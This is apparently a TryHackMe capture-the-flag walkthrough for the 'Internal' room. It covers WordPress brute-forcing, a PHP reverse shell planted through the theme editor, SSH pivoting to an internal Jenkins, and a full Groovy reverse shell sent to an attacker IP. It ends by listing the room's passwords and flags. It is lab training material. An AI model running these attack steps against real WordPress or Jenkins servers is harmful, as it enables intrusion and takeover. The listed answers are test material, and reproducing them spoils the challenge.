# Internal

Welcome to the Internal room walkthrough on TryHackMe!

{% embed url="https://tryhackme.com/room/internal" %}

***

Internal is a hard-difficulty boot-to-root Linux challenge simulating a realistic internal penetration test. The full attack chain involves mapping hostnames, enumerating and exploiting a WordPress installation, lateral movement via harvested credentials, SSH port forwarding to access an internal Jenkins service, executing Groovy reverse shells, and escalating to root.

---

## 1. Network Reconnaissance & Scope Setup

Per the room's instructions, we map the target IP address to `internal.thm` in `/etc/hosts`:

```bash
sudo echo "<TARGET_IP> internal.thm" >> /etc/hosts
```

Now we scan the target using Nmap:

```bash
nmap -sC -sV -oN nmap_internal.txt internal.thm
```

### Scan Output:
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

We have two standard ports:
- **Port 22 (SSH)**
- **Port 80 (HTTP)**

---

## 2. Web Directory Discovery & WordPress Enumeration

We run `gobuster` on `http://internal.thm`:

```bash
gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirb/common.txt
```

### Discovered Endpoints:
```text
/blog                 (Status: 301) [--> http://internal.thm/blog/]
/javascript           (Status: 301)
/phpmyadmin           (Status: 301)
/wordpress            (Status: 301) [--> http://internal.thm/wordpress/]
```

Navigating to `http://internal.thm/blog/` redirects to a WordPress installation. 

We run `wpscan` to enumerate WordPress users:

```bash
wpscan --url http://internal.thm/blog/ --enumerate u
```

The scan confirms the administrator username: **`admin`**.

Next, we launch a dictionary attack against `admin` using `rockyou.txt`:

```bash
wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt
```

Result:
```text
[+] Performing password attack on Xmlrpc ...
[+] SUCCESS: admin : my210473
```

**WordPress Credentials:** `admin` : `my210473`

---

## 3. Initial Access via WordPress Theme Editor

We log in to the WordPress dashboard at `http://internal.thm/blog/wp-login.php`.

To get remote code execution:
1. Navigate to **Appearance** -> **Theme Editor**.
2. Select the `Twenty Seventeen` theme and open `404.php`.
3. Replace the content of `404.php` with the standard PentestMonkey PHP Reverse Shell, configuring our attacking IP and port `4444`.
4. Click **Update File**.
5. Set up a netcat listener on our machine:
   ```bash
   nc -lvnp 4444
   ```
6. Trigger the reverse shell in the browser:
   ```text
   http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
   ```

We catch the reverse shell as `www-data`:
```bash
$ whoami
www-data
```

Upgrade to an interactive TTY shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 4. Lateral Movement & User Flag

We search the filesystem for interesting configuration and credential files:

```bash
ls -la /opt
```

Output:
```text
total 12
drwxr-xr-x  2 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
-rw-r--r--  1 root root  173 Aug  3  2020 wp-save.txt
```

Reading `/opt/wp-save.txt`:
```bash
cat /opt/wp-save.txt
```
```text
user: aubreanna
pass: bubb13guM!@#123
```

We now have credentials for local user **`aubreanna`** (`bubb13guM!@#123`).

We connect via SSH or switch user:

```bash
ssh aubreanna@internal.thm
```
Password: `bubb13guM!@#123`

```bash
aubreanna@internal:~$ whoami
aubreanna
aubreanna@internal:~$ cat /home/aubreanna/user.txt
THM{int3rna1_fl4g_1}
```

**User Flag:** `THM{int3rna1_fl4g_1}`

---

## 5. Pivoting to Internal Jenkins

In `aubreanna`'s home directory, we discover a note named `jenkins.txt`:

```bash
cat /home/aubreanna/jenkins.txt
```
```text
Internal System:
Jenkins service is running on 172.17.0.2:8080
```

The Jenkins service is running on an internal Docker container and cannot be accessed externally. We set up local port forwarding over SSH:

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

Now we can navigate to `http://127.0.0.1:8080/` on our attacking machine to see the Jenkins login panel.

We brute-force the Jenkins `admin` login using Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Result:
```text
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
```

**Jenkins Credentials:** `admin` : `spongebob`

---

## 6. Escalating to Root

1. Log in to Jenkins as `admin`.
2. Navigate to **Manage Jenkins** -> **Script Console** (`http://127.0.0.1:8080/script`).
3. Execute the following Groovy reverse shell:

```groovy
String host="<ATTACKER_IP>";
int port=5555;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

4. Catch the shell on our listener (`nc -lvnp 5555`). We land inside the Docker container as `root`.
5. Check `/opt` for further files:
   ```bash
   cat /opt/note.txt
   ```
   Output:
   ```text
   root:tr0ub13guM!@#123
   ```
6. Return to our host SSH session and switch to `root`:
   ```bash
   su root
   ```
   Password: `tr0ub13guM!@#123`

```bash
root@internal:~# whoami
root
root@internal:~# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
```

**Root Flag:** `THM{d0ck3r_d3str0y3r}`

---

## 🏁 Questions & Answers

| Task / Question | Answer |
| :--- | :--- |
| **User Flag** | `THM{int3rna1_fl4g_1}` |
| **Root Flag** | `THM{d0ck3r_d3str0y3r}` |

***
